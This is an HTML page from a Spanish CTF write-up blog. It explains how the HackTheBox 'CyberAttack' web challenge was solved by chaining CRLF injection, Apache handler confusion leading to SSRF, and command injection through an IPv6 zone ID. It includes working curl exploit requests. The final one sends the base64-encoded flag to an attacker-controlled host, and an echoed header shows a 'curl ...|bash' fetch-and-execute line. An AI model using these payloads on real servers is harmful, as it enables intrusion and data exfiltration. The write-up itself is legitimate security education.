@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  
+    <title>HTB Cyber Apocalypse 2025 | CyberAttack WriteUp :: Hackers Fight Club Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Introducción Recientemente se llevó a cabo el CTF anual de HackTheBox &ldquo;Cyber Apocalypse&rdquo;. Uno de los retos que más me gustó dentro de la categoría Web fue &ldquo;Cyber Attack&rdquo;. Como todos los retos de este CTF, este está ambientado en el mundo fantástico de Eldoria. Se nos presenta una aplicación web destinada a atacar a los enemigos de Malakar.
+A grandes rasgos, el reto requería explotar una inyección CRLF, una vulnerabilidad de tipo SSRF y una inyección de comandos. Adicionalmente para lograr resolverlo, fue necesario comprender algo llamado &ldquo;ambigüedad semántica&rdquo; en servidores Apache y aplicar un pequeño truco en IPv6 para conseguir inyectar comandos. Para resolver el reto, se nos provee el código fuente de la aplicación y archivos de configuración del servidor web.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://albertnath.github.io/hfc-blog/posts/htb_cyber_apocalypse_2025_cyberattack/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/code.min.4f0ccc8439f99bf7f7970298556b94011aabc1fcae743b6842fc3361a2da9ea3.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/main.min.15870410d15d02abd22fb5ef00996f65a00d04b3a7435e9f83831c7c2298de88.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="https://albertnath.github.io/hfc-blog/favicon.png">
+<link rel="apple-touch-icon" href="https://albertnath.github.io/hfc-blog/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="vir" />
+
+
+
+<meta property="og:locale" content="es" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Cyber Apocalypse 2025 | CyberAttack WriteUp">
+<meta property="og:description" content="Introducción Recientemente se llevó a cabo el CTF anual de HackTheBox &ldquo;Cyber Apocalypse&rdquo;. Uno de los retos que más me gustó dentro de la categoría Web fue &ldquo;Cyber Attack&rdquo;. Como todos los retos de este CTF, este está ambientado en el mundo fantástico de Eldoria. Se nos presenta una aplicación web destinada a atacar a los enemigos de Malakar.
+A grandes rasgos, el reto requería explotar una inyección CRLF, una vulnerabilidad de tipo SSRF y una inyección de comandos. Adicionalmente para lograr resolverlo, fue necesario comprender algo llamado &ldquo;ambigüedad semántica&rdquo; en servidores Apache y aplicar un pequeño truco en IPv6 para conseguir inyectar comandos. Para resolver el reto, se nos provee el código fuente de la aplicación y archivos de configuración del servidor web.
+" />
+<meta property="og:url" content="https://albertnath.github.io/hfc-blog/posts/htb_cyber_apocalypse_2025_cyberattack/" />
+<meta property="og:site_name" content="Hackers Fight Club Blog" />
+
+  <meta property="og:image" content="https://albertnath.github.io/hfc-blog/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-05-15 13:21:10 -0600 CST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://albertnath.github.io/hfc-blog/hfc-blog">
+  <div class="logo">
+    Hackers Fight Club Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/acerca-de">Acerca De</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/authors">Autores</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/tags">Categorías</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/posts">Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/acerca-de" >Acerca De</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/authors" >Autores</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/tags" >Categorías</a></li>
+        
+      
+      
+        <li>
+          <ul class="menu">
+            <li class="menu__trigger">Más&nbsp;▾</li>
+            <li>
+              <ul class="menu__dropdown">
+                
+                  
+                    <li><a href="https://albertnath.github.io/hfc-blog/posts" >Posts</a></li>
+                  
+                
+              </ul>
+            </li>
+          </ul>
+        </li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://albertnath.github.io/hfc-blog/posts/htb_cyber_apocalypse_2025_cyberattack/">HTB Cyber Apocalypse 2025 | CyberAttack WriteUp</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">15-05-2025</time><span class="post-author">vir</span><span class="post-reading-time">9 min. de lectura (1871 palabras)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/writeup/">Writeup</a>&nbsp;
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/web-hacking/">Web hacking</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="introducción">Introducción<a href="#introducción" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Recientemente se llevó a cabo el CTF anual de HackTheBox &ldquo;Cyber Apocalypse&rdquo;. Uno de los retos que más me gustó dentro de la categoría Web fue &ldquo;Cyber Attack&rdquo;. Como todos los retos de este CTF, este está ambientado en el mundo fantástico de Eldoria. Se nos presenta una aplicación web destinada a atacar a los enemigos de Malakar.</p>
+<p>A grandes rasgos, el reto requería explotar una inyección CRLF, una vulnerabilidad de tipo SSRF y una inyección de comandos. Adicionalmente para lograr resolverlo, fue necesario comprender algo llamado &ldquo;ambigüedad semántica&rdquo; en servidores Apache y aplicar un pequeño truco en IPv6 para conseguir inyectar comandos. Para resolver el reto, se nos provee el código fuente de la aplicación y archivos de configuración del servidor web.</p>
+<h2 id="desarrollo">Desarrollo<a href="#desarrollo" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>La aplicación muestra un formulario permite introducir el nombre del usuario y el nombre de dominio o dirección IP a atacar. El siguiente ejemplo muestra el funcionamiento de la aplicación al usarla para atacar un nombre de dominio.</p>
+
+<img src="https://albertnath.github.io/hfc-blog/img/htb_cyber_apocalypse_2025_cyberattack/img1.png"  alt="img1"  class="center"    />
+
+
+<p>Al enviar el formulario, regresa un mensaje indicando que el ataque fue exitoso. Dicho mensaje se obtiene del parámetro <code>result</code> en la URL.</p>
+
+<img src="https://albertnath.github.io/hfc-blog/img/htb_cyber_apocalypse_2025_cyberattack/img2.png"  alt="img1"  class="center"    />
+
+
+<p>El siguiente ejemplo muestra el uso de la funcionalidad de atacar una dirección IP.</p>
+
+<img src="https://albertnath.github.io/hfc-blog/img/htb_cyber_apocalypse_2025_cyberattack/img3.png"  alt="img1"  class="center"    />
+
+
+<p>Sin embargo, en este caso recibimos un error <em>Forbidden</em>, pues no tenemos permitido interactuar con el recurso <code>/cgi-bin/attack-ip</code>.</p>
+
+<img src="https://albertnath.github.io/hfc-blog/img/htb_cyber_apocalypse_2025_cyberattack/img4.png"  alt="img1"  class="center"    />
+
+
+<p>Esto se entiende al ver el archivo de configuración <code>apache2.conf</code>, pues permite la interacción con dicho script únicamente si la petición HTTP se origina en el propio servidor:</p>
+<pre tabindex="0"><code>ServerName CyberAttack
+
+AddType application/x-httpd-php .php
+
+&lt;Location &#34;/cgi-bin/attack-ip&#34;&gt;
+Order deny,allow
+Deny from all
+Allow from 127.0.0.1
+Allow from ::1
+&lt;/Location&gt;
+</code></pre><p>A continuación, se muestra el código fuente de ambos scripts y algunas conclusiones a las que llegué después de analizarlo.</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+
+import cgi
+import os
+import re
+
+def is_domain(target):
+return re.match(r&#39;^(?!-)[a-zA-Z0-9-]{1,63}(?&lt;!-)\.[a-zA-Z]{2,63}$&#39;, target)
+
+form = cgi.FieldStorage()
+name = form.getvalue(&#39;name&#39;)
+target = form.getvalue(&#39;target&#39;)
+if not name or not target:
+print(&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;)
+
+elif is_domain(target):
+count = 1 # Increase this for an actual attack
+os.popen(f&#39;ping -c {count} {target}&#39;)
+print(f&#39;Location: ../?result=Succesfully attacked {target}!&#39;)
+else:
+print(f&#39;Location: ../?error=Hey {name}, watch it!&#39;)
+
+print(&#39;Content-Type: text/html&#39;)
+print()
+</code></pre><ul>
+<li>Se utiliza el comando <code>ping</code> para atacar el servicio que se le indica.</li>
+<li>Parece haber una inyección de comandos, pues el parámetro <code>target</code> se usa en la función <code>os.popen()</code>. Sin embargo, el mismo parámetro primero se verifica con una expresión regular y, si no tiene el formato de un nombre de dominio, no se ejecuta la función.</li>
+<li>En caso de no pasar la verificación, la respuesta HTTP será una redirección a través del encabezado <code>Location</code>, en donde se envía un mensaje de error concatenando el nombre del usuario. Al hacer esta concatenación en un encabezado, podría ser vulnerable a una inyección <em>CRLF</em>.</li>
+<li>Una interacción con este recurso se muestra a continuación, forzando un error al enviar un nombre de dominio inválido.</li>
+</ul>
+<pre tabindex="0"><code>$ curl &#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v&#39;
+&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;302 Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Found&lt;/h1&gt;
+&lt;p&gt;The document has moved &lt;a href=&#34;../?error=Hey v, watch it!&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at 83.136.249.227 Port 46378&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre><p><strong>attack-ip:</strong></p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+
+import cgi
+import os
+from ipaddress import ip_address
+
+form = cgi.FieldStorage()
+name = form.getvalue(&#39;name&#39;)
+target = form.getvalue(&#39;target&#39;)
+
+if not name or not target:
+print(&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;)
+try:
+count = 1 # Increase this for an actual attack
+os.popen(f&#39;ping -c {count} {ip_address(target)}&#39;)
+print(f&#39;Location: ../?result=Succesfully attacked {target}!&#39;)
+except:
+print(f&#39;Location: ../?error=Hey {name}, watch it!&#39;)
+
+print(&#39;Content-Type: text/html&#39;)
+print()
+</code></pre><ul>
+<li>El funcionamiento es muy similar al caso anterior, pero con pequeñas variaciones.</li>
+<li>Se utiliza nuevamente el comando <code>ping</code> para atacar la dirección IP indicada.</li>
+<li>En este caso, también parece haber una inyección de comandos, pues el parámetro <code>target</code> se usa en la función <code>os.popen()</code>, pero en este caso hay una validación con la función <code>ip_address()</code>. Esta función genera una excepción si la cadena recibida no tiene el formato de una dirección IPv4 o IPv6 válida.</li>
+<li>En caso de generarse la excepción, no realiza el ataque y envía una redirección con un mensaje de error en el encabezado <code>Location</code>.</li>
+</ul>
+<p>Llegados a este punto, tenía claro que el único recurso con el que podría interactuar directamente era <code>/cgi-bin/attack-domain</code> y que debía lograr interactuar con <code>/cgi-bin/attack-ip</code> (ya que su acceso estaba limitado). Aunque buscaba alguna manera de forzar un <em>SSRF</em>, al inicio únicamente era capaz de inyectar encabezados HTTP en la respuesta. Esto lo muestro a continuación, logrando que la respuesta incluyera el nuevo encabezado <code>New-Header: HFC</code> inyectando los caracteres de retorno de carro y salto de línea <code>(%0d%0a)</code>.</p>
+<pre tabindex="0"><code>$ curl -i &#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aNew-Header:HFC%0d%0a%0d%0a&#39;
+HTTP/1.1 302 Found
+Date: Wed, 26 Mar 2025 03:14:46 GMT
+Server: Apache/2.4.54 (Debian)
+New-Header: HFC
+Location: ../?error=Hey v
+Content-Length: 282
+Content-Type: text/html; charset=iso-8859-1
+
+&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;302 Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Found&lt;/h1&gt;
+&lt;p&gt;The document has moved &lt;a href=&#34;../?error=Hey v&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;--REDACTED--&gt;
+</code></pre><p>Después de un buen rato de buscar algún recurso que pudiera servirme, llegué a este <a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">sitio</a>. Aquí se detalla el término de &ldquo;ambigüedad semántica&rdquo; en servidores Apache. A grandes rasgos, explica que Apache funciona mediante una gran cantidad de módulos. Estos módulos no necesariamente tienen una forma estandarizada de interpretar los campos que van a procesar, provocando ambigüedades en cómo lo manipulan.</p>
+<p>El sitio detalla 3 tipos diferentes de ataques desarrollados a partir de dicha ambigüedad, pero para este reto utilicé únicamente el llamado <em>Handler Confusion</em>, donde se busca invocar algún <em>handler</em> de Apache de forma arbitraria. Para comprender correctamente el origen e implicaciones del problema, se recomienda leer el artículo original. A continuación, únicamente agregaré una explicación muy resumida de esto, esperando que sea suficiente para comprender la solución al reto.</p>
+<p>El autor explica que al utilizar el módulo <code>mod_php</code>, hay dos directivas que se parecen mucho en funcionalidad, pero que representan campos diferentes dentro de la estructura de httpd:</p>
+<p><strong>Directivas:</strong></p>
+<pre tabindex="0"><code>AddHandler application/x-httpd-php .php
+AddType    application/x-httpd-php .php
+</code></pre><p><strong>Sintaxis:</strong></p>
+<pre tabindex="0"><code>AddHandler handler-name extensión [extensión] ...
+AddType media-type extensión [extensión] ...
+</code></pre><p>Aunque tienen una funcionalidad muy similar, realmente <code>handler-name</code> corresponde a la estructura <code>r-&gt;handler</code> y <code>media-type</code> corresponde a <code>r-&gt;content_type</code> dentro de httpd. Algo curioso (y por lo que se parecen tanto) es que tras bambalinas, <code>media-type</code> se termina convirtiendo en <code>handler-name</code>. El autor indica que, en teoría, si se logra controlar el encabezado <code>Content-Type</code> en la respuesta del servidor, es posible invocar cualquier handler de Apache de forma arbitraria.</p>
+<p>Sin embargo, el flujo en el que se manejan las peticiones provoca que la conversión de estructuras no se efectúe, a menos que sea el propio servidor quien inicie una nueva petición internamente. Afortunadamente para nosotros, hay escenarios en los que el servidor hace nuevas peticiones internas, uno de ellos es cuando usa el módulo <code>mod_cgi</code>. Si el encabezado HTTP <code>Location</code> inicia con el caracter &lsquo;/&rsquo;, Apache va a tratar este escenario como una redirección del lado del servidor para poder interactuar con el script CGI.</p>
+<p>Se puede concluir que para poder invocar cualquier handler de Apache, se necesitan cumplir los siguientes requisitos:</p>
+<ul>
+<li>
+<p>Módulo <code>mod_php</code> habilitado: Se confirma que se cumple, porque el archivo principal de la aplicación es index.php.</p>
+</li>
+<li>
+<p>Módulo <code>mod_cgi</code> habilitado: Se confirma que se cumple, pues la aplicación lo requiere para poder usar los scripts en Python <code>attack-domain</code> y <code>attack-ip</code>.</p>
+</li>
+<li>
+<p>Control sobre encabezados <code>Location</code> y <code>Content-Type</code> en la respuesta del servidor: Se confirma que se cumple, pues en este punto ya fue posible explotar la inyección <em>CRLF</em> para crear encabezados nuevos.</p>
+</li>
+</ul>
+<p>Con todo en su lugar, llegó el momento de usar un handler distinto. Específicamente, se usó <code>server-status</code>, con el único fin de demostrar la viabilidad de la técnica. Como se muestra a continuación, el ataque fue exitoso y fue posible acceder a información del estado del servidor, como consumo de CPU, tráfico total, etc.</p>
+<pre tabindex="0"><code>$ curl -i &#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:server-status%0d%0a%0d%0a&#39;
+HTTP/1.1 200 OK
+Date: Wed, 26 Mar 2025 03:16:46 GMT
+Server: Apache/2.4.54 (Debian)
+Vary: Accept-Encoding
+Content-Length: 4536
+Content-Type: text/html; charset=ISO-8859-1
+
+&lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;Apache Status&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Apache Server Status for 83.136.249.227 (via 192.168.63.136)&lt;/h1&gt;
+
+&lt;dl&gt;&lt;dt&gt;Server Version: Apache/2.4.54 (Debian) PHP/7.4.33&lt;/dt&gt;
+&lt;dt&gt;Server MPM: prefork&lt;/dt&gt;
+&lt;dt&gt;Server Built: 2022-06-09T04:26:43
+&lt;/dt&gt;&lt;/dl&gt;&lt;hr /&gt;&lt;dl&gt;
+&lt;dt&gt;Current Time: Wednesday, 26-Mar-2025 03:16:47 UTC&lt;/dt&gt;
+&lt;dt&gt;Restart Time: Wednesday, 26-Mar-2025 03:04:40 UTC&lt;/dt&gt;
+&lt;dt&gt;Parent Server Config. Generation: 1&lt;/dt&gt;
+&lt;dt&gt;Parent Server MPM Generation: 0&lt;/dt&gt;
+&lt;dt&gt;Server uptime:  12 minutes 6 seconds&lt;/dt&gt;
+&lt;dt&gt;Server load: 0.15 0.23 0.20&lt;/dt&gt;
+&lt;dt&gt;Total accesses: 7 - Total Traffic: 4 kB - Total Duration: 503&lt;/dt&gt;
+&lt;dt&gt;CPU Usage: u.03 s.03 cu.02 cs.01 - .0124% CPU load&lt;/dt&gt;
+&lt;dt&gt;.00964 requests/sec - 5 B/second - 585 B/request - 71.8571 ms/request&lt;/dt&gt;
+&lt;dt&gt;1 requests currently being processed, 5 idle workers&lt;/dt&gt;
+&lt;--REDACTED--&gt;
+</code></pre><p>Una vez confirmado, usé el handler <code>proxy</code> para forzar un <em>SSRF</em> completo, es decir, teniendo control sobre el destino, recurso, parámetros y encabezados de la petición. De esta manera, finalmente fue posible interactuar con <code>attack-ip</code> (pues la petición se origina desde el propio servidor).</p>
+<pre tabindex="0"><code>$ curl -i &#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%26name=v%0d%0a%0d%0a&#39;
+HTTP/1.1 302 Found
+Date: Wed, 26 Mar 2025 03:19:21 GMT
+Server: Apache/2.4.54 (Debian)
+Location: ../?result=Succesfully attacked 127.0.0.1!
+Content-Length: 301
+Content-Type: text/html; charset=iso-8859-1
+
+&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;302 Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Found&lt;/h1&gt;
+&lt;p&gt;The document has moved &lt;a href=&#34;../?result=Succesfully attacked 127.0.0.1!&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at 127.0.0.1 Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre><p>La parte final del reto consistía en explotar una vulnerabilidad dentro de <code>attack-ip</code> con el fin de inyectar comandos. Recordemos que el parámetro <code>target</code> es validado con la función <code>ip_address()</code>, la cual genera una excepción si la cadena no tiene un formato de dirección IPv4 o IPv6. A continuación, muestro un par de ejemplos de esta funcionalidad:</p>
+<p><strong>Dirección IPv4 válida:</strong></p>
+<pre tabindex="0"><code>from ipaddress import ip_address
+print(ip_address(&#39;127.0.0.1&#39;))
+</code></pre><p><strong>Resultado:</strong></p>
+<pre tabindex="0"><code>127.0.0.1
+</code></pre><p><strong>Dirección IPv4 inválida:</strong></p>
+<pre tabindex="0"><code>from ipaddress import ip_address
+print(ip_address(&#39;127.0.TEST.1&#39;))
+</code></pre><p><strong>Resultado:</strong></p>
+<pre tabindex="0"><code>ERROR!
+Traceback (most recent call last):
+  File &#34;&lt;main.py&gt;&#34;, line 2, in &lt;module&gt;
+  File &#34;/usr/local/lib/python3.12/ipaddress.py&#34;, line 54, in ip_address
+    raise ValueError(f&#39;{address!r} does not appear to be an IPv4 or IPv6 address&#39;)
+ValueError: &#39;127.0.TEST.1&#39; does not appear to be an IPv4 or IPv6 address
+</code></pre><p>Después de leer la <a href="https://docs.python.org/3/library/ipaddress.html">documentación de la biblioteca ipaddress</a> y el <a href="https://docs.python.org/3/library/ipaddress.html">RFC 4007</a>, aprendí que en IPv6 es posible indicar un identificador de zona, usando la sintaxis <code>&lt;ipv6&gt;%&lt;id_zona&gt;</code>. Lo interesante es la única validación que hace la función <code>ip_address()</code> sobre esta característica: si el caracter &lsquo;%&rsquo; está presente, el ID de zona tambien tiene que incluirse, sin verificar qué tipo de caracteres lo componen.</p>
+<p>Teniendo esto en mente, probemos nuevamente la función.</p>
+<p><strong>Dirección IPv6 con inyección de comandos en ID de zona</strong></p>
+<pre tabindex="0"><code>from ipaddress import ip_address
+print(ip_address(&#39;::1%$(whoami)&#39;))
+</code></pre><p><strong>Resultado:</strong></p>
+<pre tabindex="0"><code>::1%$(whoami)
+</code></pre><p>La idea detrás del <em>payload</em> final es codificar en base64 la bandera y usar <code>curl</code> para crear una petición HTTP, agregando la bandera codificada como parámetro en la URL y enviándola a un servidor bajo nuestro control.</p>
+<pre tabindex="0"><code>$ curl -i &#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%2bhttps://&lt;--REDACTED--&gt;?flag=`cat%2b/flag*|base64`)%26name=v%0d%0a%0d%0a&#39;
+HTTP/1.1 302 Found
+Date: Wed, 26 Mar 2025 03:42:19 GMT
+Server: Apache/2.4.54 (Debian)
+Location: ../?result=Succesfully attacked ::1%$(curl hackersfight.club:8000|bash)!
+Content-Length: 331
+Content-Type: text/html; charset=iso-8859-1
+
+&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;302 Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Found&lt;/h1&gt;
+&lt;p&gt;The document has moved &lt;a href=&#34;../?result=Succesfully attacked ::1%$(curl https://&lt;--REDACTED--&gt;?flag=`cat /flag*|base64`)!&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at 127.0.0.1 Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre><p>Finalmente, recibiendo la petición desde el servidor vulnerable y consiguiendo la bandera.</p>
+<pre tabindex="0"><code>$ grep flag access.log
+83.136.249.227 - - [26/Mar/2025:03:42:19 +0000] &#34;GET /?flag=SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0= HTTP/1.1&#34; 200 4252 &#34;-&#34; &#34;curl/7.74.0&#34;
+
+$ echo &#39;SFRCe2g0bmRsMW42X200bDRrNHI1X2YwcmMzNX0=&#39;|base64 -d
+HTB{h4ndl1n6_m4l4k4r5_f0rc35}
+</code></pre><h2 id="referencias-útiles">Referencias útiles<a href="#referencias-útiles" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">Orange Tsai | Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!</a></li>
+<li><a href="https://docs.python.org/3/library/ipaddress.html">Python docs | ipaddress — IPv4/IPv6 manipulation library</a></li>
+<li><a href="https://datatracker.ietf.org/doc/html/rfc4007.html">RFC 4007 | IPv6 Scoped Address Architecture</a></li>
+<li><a href="https://portswigger.net/web-security/ssrf">PortSwigger | Server-Side Request Forgery</a></li>
+<li><a href="https://portswigger.net/web-security/os-command-injection">PortSwigger | OS Command Injection</a></li>
+</ul>
+
+      </div></div>
+
+  
+    
+
+  
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="https://albertnath.github.io/hfc-blog/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
